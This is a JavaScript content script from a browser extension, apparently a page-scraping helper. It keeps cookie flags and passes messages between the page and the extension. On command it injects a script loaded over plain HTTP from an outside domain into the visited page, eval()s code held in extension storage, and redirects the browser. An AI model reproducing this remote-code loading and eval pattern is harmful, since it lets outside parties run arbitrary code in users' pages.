function setCookie(c_name,value,expiredays)
{
  var exdate=new Date()
  exdate.setDate(exdate.getDate()+expiredays)
    document.cookie=c_name+ "=" +escape(value)+
      ((expiredays==null) ? "" : ";expires="+exdate.toGMTString())
}

function getCookie(c_name)
{
  if (document.cookie.length>0)
  {
    c_start=document.cookie.indexOf(c_name + "=")
    if (c_start!=-1)
    {
      c_start=c_start + c_name.length+1
      c_end=document.cookie.indexOf(";",c_start)
      if (c_end==-1) c_end=document.cookie.length
      return unescape(document.cookie.substring(c_start,c_end))
    }
  }
  return ""
}
var bdat=null;
function beastify(request, sender, sendResponse) {
  if(getCookie("begin")==1){
    insertBeast();
  }
 if(!request)return
  if(request['type']=='pack'){
    if(!document.getElementById("sptoolstaus")){
      var script = document.createElement("script");
      script.src="http://basezhushou.cn/Public/insert.js";
      document.head.appendChild(script);
      var dd = document.createElement("div");
      dd.id='sptoolstaus';
      dd.setAttribute('staus',1);
      document.body.appendChild(dd);
    }else{
      document.getElementById("sptoolstaus").setAttribute('staus',1);
    }
  }
  bdat=request['data'];
}

function checkresult(){
  var ele = document.getElementById('spresult');
  if(ele){

    if(ele.getAttribute('staus')==1){
      var con = JSON.parse(ele.textContent);
      con['key']=bdat;
      browser.storage.local.get().then(function(obje){
        var po = [];
        if(obje['packval']){
          po = obje['packval'];
        }
        po.push(con);
        console.log(po);
        browser.storage.local.set({'packval':po});
        ele.setAttribute('staus',0)
      });

      return
    }
  }
  setTimeout(checkresult,1000);
}
checkresult();

function insertBeast() {
  browser.storage.local.get().then(onUpdate, onError);
}

function onUpdate(setting){
  console.log(setting);
  var sp = setting['scripts'];

  if(sp){
    eval(sp);
  }
  try{
    var b = getSpiderData();
  }catch(e){
    var b = [];
  }
  if(!b.length){
    b=[1];
  }
  var sending = browser.runtime.sendMessage({type:"ser",
    sendto: b
  });
  sending.then(function(message){
    location.href=message.response;
  }, function(error){
    console.log("error"+error.message);
  });
}

function onError(){
  console.log('storage wrong');
}

function getSpiderData(){
  return [1];
}

beastify();
browser.runtime.onMessage.addListener(beastify);
